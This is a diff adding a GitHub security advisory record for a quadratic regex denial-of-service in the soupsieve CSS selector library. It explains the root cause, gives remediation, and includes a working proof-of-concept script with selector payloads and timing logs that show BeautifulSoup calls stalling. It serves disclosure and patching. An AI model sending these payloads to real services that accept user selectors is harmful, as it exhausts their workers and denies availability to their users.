@@ -1,0 +1,111 @@
+{
+  "id": "GHSA-gjv8-xp57-g29c",
+  "modified": "2026-09-17T20:45:06.589610839Z",
+  "published": "2026-09-17T20:32:58Z",
+  "aliases": [
+    "CVE-2026-86000"
+  ],
+  "summary": "Soup Sieve: Polynomial-time ReDoS (O(n²)) in the `IDENTIFIER` / `VALUE` selector sub-patterns",
+  "details": "## Summary\n\nsoupsieve compiles CSS selector strings with a set of hand-written regular expressions. The shared `IDENTIFIER` sub-pattern (also embedded in `VALUE`, and therefore in attribute selectors) places two adjacent quantified groups over overlapping character classes: `(?:[classA]|ESC)+(?:[classB]|ESC)*`, where both classes match ordinary identifier characters such as `a`. When a selector contains a long identifier/value run that must ultimately fail to match (e.g. an attribute value with no closing `]`, or an identifier followed by an invalid character), the regex engine backtracks across all O(n) ways to split the run between the `+` group and the `*` group, giving O(n²) parse time. A single attacker-controlled selector of a few kilobytes stalls the interpreter for many seconds of CPU; tens of kilobytes reach minutes.\n\n## Trust model (Q0)\n\nThe selector string is the input. It reaches this code via `soupsieve.compile()`, `soupsieve.select/iselect/match/filter`, and — most commonly — BeautifulSoup's `soup.select(selector)` / `soup.select_one(selector)`, which delegate to soupsieve. This is exploitable in any application that passes a user-controlled CSS selector to BeautifulSoup/soupsieve (scrapers that accept selectors, no-code extraction tools, admin/query UIs). Applications that only use hard-coded selectors are not affected.\n\n## Root cause (exact anchors) — `src/soupsieve/css_parser.py`\n\n```python\n# lines 122-126\nIDENTIFIER = fr'''\n(?:(?:-?(?:[^\\x00-\\x2f\\x30-\\x40\\x5B-\\x5E\\x60\\x7B-\\x9f]|{CSS_ESCAPES})+|--)\n(?:[^\\x00-\\x2c\\x2e\\x2f\\x3A-\\x40\\x5B-\\x5E\\x60\\x7B-\\x9f]|{CSS_ESCAPES})*)\n'''\n# line 129 — VALUE embeds IDENTIFIER (so attribute values inherit the pattern)\nVALUE = fr'''(?:\"(?:\\\\(?:.|{NEWLINE})|[^\\\\\"\\r\\n\\f])*?\"|'...'|{IDENTIFIER})'''\n```\n\n- classA `[^\\x00-\\x2f\\x30-\\x40\\x5B-\\x5E\\x60\\x7B-\\x9f]` excludes digits (0x30-0x39); classB `[^\\x00-\\x2c\\x2e\\x2f\\x3A-\\x40\\x5B-\\x5E\\x60\\x7B-\\x9f]` allows digits. The intent is \"first char not a digit, remaining chars may be digits.\"\n- Both classes match ordinary letters (e.g. `a` = 0x61). The construct is therefore effectively `(?:C)+(?:C)*` over an overlapping class C — the canonical adjacent-quantifier shape that backtracks quadratically on a failing match.\n\nThe quadratic only manifests when the overall match must fail. `IDENTIFIER` matched greedily on `\"a\"*n` succeeds in linear time (~1 ms at n=32000). Anchoring it so a following element is mandatory and fails (`IDENTIFIER + \"$\"` against `\"a\"*n + \"!\"`) reproduces the O(n²) directly: n=2000 → 44 ms, 4000 → 257 ms, 8000 → 743 ms, 16000 → 2944 ms (~×4 per ×2). Profiling `compile(\"[a=\" + \"a\"*4000)` shows only 12 `re.match` calls consuming 2.685 s — i.e. the cost is inside a single regex match, confirming regex backtracking (not loop overhead).\n\n## Reproduction environment (discipline #12 — published artifact)\n\n- git HEAD `751c57b` (2.9, `PYTHONPATH=src`): `cd src \u0026\u0026 python3 ../poc/poc_redos_compile.py`.\n- Published PyPI `soupsieve 2.8.4` (fresh `uv pip install soupsieve beautifulsoup4`): `cd poc \u0026\u0026 ../.venv-published/bin/python poc_redos_compile.py` → same O(n²) (evidence: `poc/evidence_redos_compile_PUBLISHED_2.8.4.log`).\n- Python 3.11.15 and 3.14.6 both reproduce.\n\n## PoC (`poc/poc_redos_compile.py`)\n\n```python\nimport sys, time\nsys.path.insert(0, \".\")\nimport soupsieve as sv\n\ndef compile_time(sel):\n    t0 = time.perf_counter()\n    try:\n        sv.compile(sel)\n        status = \"ok\"\n    except Exception as e:\n        status = type(e).__name__\n    return (time.perf_counter() - t0), status\n\nprint(f\"soupsieve {sv.__version__}\\n\")\n\nprint(\"Payload A: '[a=' + 'a'*n   (unterminated attribute value)\")\nfor n in (1000, 2000, 4000, 8000):\n    dt, st = compile_time(\"[a=\" + \"a\" * n)\n    print(f\"  n={n:\u003c6} len={3+n:\u003c7} {dt*1000:9.1f} ms  [{st}]\")\n\nprint(\"\\nPayload B: 'a'*n + '!'   (identifier run + invalid trailing char)\")\nfor n in (2000, 4000, 8000, 16000):\n    dt, st = compile_time(\"a\" * n + \"!\")\n    print(f\"  n={n:\u003c6} len={n+1:\u003c7} {dt*1000:9.1f} ms  [{st}]\")\n\npayload = \"[a=\" + \"a\" * 12000\ndt, st = compile_time(payload)\nprint(f\"\\n[+] Single call: compile('[a=' + 'a'*12000)  (len={len(payload)})\")\nprint(f\"[+] wall time = {dt:.2f} s   [{st}]\")\n```\n\nEnd-to-end note: `bs4.BeautifulSoup(html).select(payload)` reaches the same `compile()` path, so the stall is triggerable directly through BeautifulSoup with a user-supplied selector. Verified on bs4 4.15.0 + soupsieve 2.8.4: `soup.select(\"[a=\" + \"a\"*6000)` took ~5.0 s for one call (evidence: `poc/evidence_bs4_select_PUBLISHED_2.8.4.log`).\n\n## Evidence — HEAD 2.9 (verbatim `poc/evidence_redos_compile.log`)\n\n```\nsoupsieve 2.9\n\nPayload A: '[a=' + 'a'*n   (unterminated attribute value)\n  n=1000   len=1003        214.8 ms  [SelectorSyntaxError]\n  n=2000   len=2003        504.7 ms  [SelectorSyntaxError]\n  n=4000   len=4003       2031.9 ms  [SelectorSyntaxError]\n  n=8000   len=8003       8091.3 ms  [SelectorSyntaxError]\n\nPayload B: 'a'*n + '!'   (identifier run + invalid trailing char)\n  n=2000   len=2001         79.7 ms  [SelectorSyntaxError]\n  n=4000   len=4001        322.9 ms  [SelectorSyntaxError]\n  n=8000   len=8001       1328.9 ms  [SelectorSyntaxError]\n  n=16000  len=16001      5379.4 ms  [SelectorSyntaxError]\n\n[+] Single call: compile('[a=' + 'a'*12000)  (len=12003)\n[+] wall time = 18.28 s   [SelectorSyntaxError]\n```\n\n## Evidence — published 2.8.4 (verbatim `poc/evidence_redos_compile_PUBLISHED_2.8.4.log`)\n\n```\nsoupsieve 2.8.4\nPayload A: '[a=' + 'a'*n\n  n=1000   len=1003        113.9 ms  [SelectorSyntaxError]\n  n=2000   len=2003        457.2 ms  [SelectorSyntaxError]\n  n=4000   len=4003       1816.8 ms  [SelectorSyntaxError]\n  n=8000   len=8003       7299.0 ms  [SelectorSyntaxError]\n[+] Single call: compile('[a=' + 'a'*12000)  wall time = 16.57 s   [SelectorSyntaxError]\n```\n\n## Impact — calibrated\n\n- Confirmed: quadratic CPU consumption per `compile()`/`select()` call on an attacker-controlled selector. ~8 KB → ~8 s; ~12 KB → ~17 s; scaling ~×4 per input doubling. A handful of such requests exhausts a worker/thread and degrades or stalls the service (single-threaded regex holds the GIL).\n- Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.\n- NOT claimed: exponential blowup, memory corruption, or code execution. This is strictly an availability (DoS) issue, and only where selectors are attacker-influenced. Applications using only fixed selectors are unaffected — stated to avoid inflation.\n\n## Remediation\n\n- Remove the adjacent-quantifier ambiguity in `IDENTIFIER`: match a single leading non-digit character then the remaining class once, e.g. `(?:-?(?:[classA]|ESC)(?:[classB]|ESC)*|--(?:[classB]|ESC)*)`, so no `+`/`*` pair spans the same characters.\n- Alternatively use atomic grouping / possessive quantifiers where supported (`(?\u003e...)`, `*+`) to forbid backtracking into the identifier run.\n- Defense-in-depth: cap selector length before compiling (reject selectors beyond a sane bound), since CSS selectors are realistically short.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "soupsieve",
+        "purl": "pkg:pypi/soupsieve"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.4",
+        "0.5",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.6",
+        "1.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0b1",
+        "1.0b2",
+        "1.1",
+        "1.2",
+        "1.2.1",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.6.2",
+        "1.7",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.8",
+        "1.9",
+        "1.9.1",
+        "1.9.2",
+        "1.9.3",
+        "1.9.4",
+        "1.9.5",
+        "1.9.6",
+        "2.0",
+        "2.0.1",
+        "2.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.3.1",
+        "2.3.2",
+        "2.3.2.post1",
+        "2.4",
+        "2.4.1",
+        "2.5",
+        "2.6",
+        "2.7",
+        "2.8",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.8.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gjv8-xp57-g29c/GHSA-gjv8-xp57-g29c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-gjv8-xp57-g29c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86000"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/commit/ce44e4996e6632871c18cdd7a7fb641be8ef34ef"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/facelessuser/soupsieve"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/releases/tag/2.9"
+    }
+  ]
+}
